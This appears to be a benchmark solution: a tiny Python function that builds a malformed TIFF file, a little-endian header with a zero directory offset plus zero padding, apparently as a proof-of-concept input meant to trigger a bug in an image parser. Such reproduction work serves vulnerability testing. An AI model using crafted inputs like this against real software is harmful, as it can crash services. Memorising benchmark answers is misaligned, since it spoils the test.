class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x49\x49\x2A\x00\x00\x00\x00\x00'
        padding = b'\x00' * 154
        return header + padding